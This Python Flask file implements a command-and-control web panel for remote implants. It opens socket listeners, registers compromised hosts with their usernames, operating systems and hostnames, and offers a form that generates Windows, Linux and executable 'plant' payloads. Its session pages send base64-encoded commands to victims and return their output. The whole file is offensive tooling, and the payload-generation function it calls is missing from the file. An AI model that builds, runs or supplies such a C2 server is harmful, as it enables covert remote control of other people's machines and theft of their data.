from flask import Flask, render_template, request, redirect, url_for, flash, jsonify
import socket
import threading
import time
from datetime import datetime
import base64

app = Flask(__name__)
app.secret_key = 'your_secret_key'

targets = []
listener_counter = 0
kill_flag = 0
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def comm_in(targ_id):
    message_rec = targ_id.recv(1024).decode('utf-8')
    message_rec = base64.b64decode(message_rec).decode('utf-8')
    return message_rec

def comm_out(targ_id, message):
    message = str(message)
    message = base64.b64encode(bytes(message, encoding='utf8')).decode('utf-8')
    targ_id.send(message.encode('utf-8'))

def listener_handler(host_ip, host_port):
    global listener_counter
    sock.bind((host_ip, int(host_port)))
    sock.listen()
    threading.Thread(target=comm_handler).start()
    listener_counter += 1

def kill_sig(targ_id, message):
    message = str(message)
    message = base64.b64encode(bytes(message, encoding='utf8'))
    targ_id.send(message)

def comm_handler():
    global targets
    while True:
        if kill_flag == 1:
            break
        try:
            remote_target, remote_ip = sock.accept()
            username = remote_target.recv(1024).decode()
            username = base64.b64decode(username).decode()
            op_sys = remote_target.recv(1024).decode()
            op_sys = base64.b64decode(op_sys).decode()
            pay_val = 1 if 'Windows' in op_sys else 2
            cur_time = time.strftime("%H:%M:%S", time.localtime())
            date = datetime.now()
            time_record = f"{date.month}/{date.day}/{date.year} {cur_time}"
            try:
                host_name = socket.gethostbyaddr(remote_ip[0])[0]
            except socket.herror:
                host_name = remote_ip[0]
            targets.append([remote_target, f"{host_name}@{remote_ip[0]}", time_record, username, op_sys, pay_val, 'Active'])
        except:
            pass

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/listeners', methods=['GET', 'POST'])
def listeners():
    if request.method == 'POST':
        host_ip = request.form['host_ip']
        host_port = request.form['host_port']
        listener_handler(host_ip, host_port)
        flash('Listener created successfully!', 'success')
        return redirect(url_for('listeners'))
    return render_template('listeners.html', listener_counter=listener_counter)

@app.route('/generate_payload', methods=['GET', 'POST'])
def generate_payload_view():
    if request.method == 'POST':
        payload_type = request.form['payload_type']
        host_ip = request.form['host_ip']
        host_port = request.form['host_port']
        if payload_type == 'winplant':
            file_name = 'winplant.py'
        elif payload_type == 'linplant':
            file_name = 'linplant.py'
        else:
            file_name = 'exeplant.py'
        generate_payload(file_name, host_ip, host_port)
        flash(f'{file_name} payload generated successfully!', 'success')
        return redirect(url_for('generate_payload_view'))
    return render_template('generate_payload.html')

@app.route('/sessions', methods=['GET'])
def sessions():
    session_counter = 0
    sessions = []
    for target in targets:
        sessions.append([session_counter, target[3], target[6], target[1], target[2], target[4]])
        session_counter += 1
    return render_template('sessions.html', sessions=sessions)

@app.route('/kill_session/<int:session_id>', methods=['POST'])
def kill_session(session_id):
    try:
        targ_id = targets[session_id][0]
        if targets[session_id][6] == 'Active':
            kill_sig(targ_id, 'exit')
            targets[session_id][6] = 'Dead'
            flash(f'Session {session_id} terminated successfully!', 'success')
        else:
            flash('Cannot interact with a dead session', 'danger')
    except IndexError:
        flash(f'Session {session_id} does not exist', 'danger')
    return redirect(url_for('sessions'))

@app.route('/session/<int:session_id>', methods=['GET', 'POST'])
def session(session_id):
    if request.method == 'POST':
        data = request.get_json()
        if not data or 'command' not in data:
            return jsonify({"error": "Invalid input"}), 400
        command = data['command']
        targ_id = targets[session_id][0]
        print(f"Sending command to session {session_id}: {command}")
        comm_out(targ_id, command)

        if command == 'exit':
            targets[session_id][6] = 'Dead'
            flash('Session terminated', 'success')
            return redirect(url_for('sessions'))

        response = comm_in(targ_id)
        print(f"Received response from session {session_id}: {response}")
        return jsonify(response=response)
    return render_template('session.html', session_id=session_id, target=targets[session_id])

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0')
